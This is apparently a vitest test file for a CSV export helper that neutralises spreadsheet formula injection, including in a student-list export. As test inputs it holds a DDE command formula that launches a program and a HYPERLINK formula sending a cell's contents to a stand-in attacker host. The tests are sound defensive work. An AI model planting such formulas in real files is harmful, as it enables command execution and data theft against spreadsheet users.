import { describe, expect, it } from "vitest";
import { csvCell, neutraliseFormula } from "../csvCell";
import { toCsv as studentToCsv } from "@/lib/students/studentListRows";

describe("CSV formula injection", () => {
  it("neutralises every leading character a spreadsheet treats as a formula", () => {
    for (const lead of ["=", "+", "@", "\t", "\r"]) {
      expect(neutraliseFormula(`${lead}HYPERLINK("http://x")`)).toBe(`'${lead}HYPERLINK("http://x")`);
    }
    expect(neutraliseFormula("-1+1")).toBe("'-1+1");
  });

  it("leaves ordinary values byte-for-byte alone", () => {
    for (const value of ["Ama Johnson", "BSPH 401", "Public Health", "3.0", "PAPE 1", "", "A+"]) {
      expect(neutraliseFormula(value)).toBe(value);
    }
  });

  it("does not mangle a genuine negative number", () => {
    expect(neutraliseFormula("-3")).toBe("-3");
    expect(neutraliseFormula("-2.5")).toBe("-2.5");
  });

  it("still applies RFC 4180 quoting on top", () => {
    expect(csvCell("Smith, John")).toBe('"Smith, John"');
    expect(csvCell('He said "hi"')).toBe('"He said ""hi"""');
    expect(csvCell("=cmd|'/c calc'!A1, x")).toBe(`"'=cmd|'/c calc'!A1, x"`);
  });

  it("the real student export cannot emit a live formula", () => {
    const csv = studentToCsv(
      [{ key: "name", header: "Name" }],
      [{ name: '=HYPERLINK("https://attacker.test?"&A1,"Click")' }],
    );
    const dataLine = csv.split("\r\n")[1];
    expect(dataLine.startsWith("=")).toBe(false);
    expect(dataLine).toContain("'=HYPERLINK");
  });
});
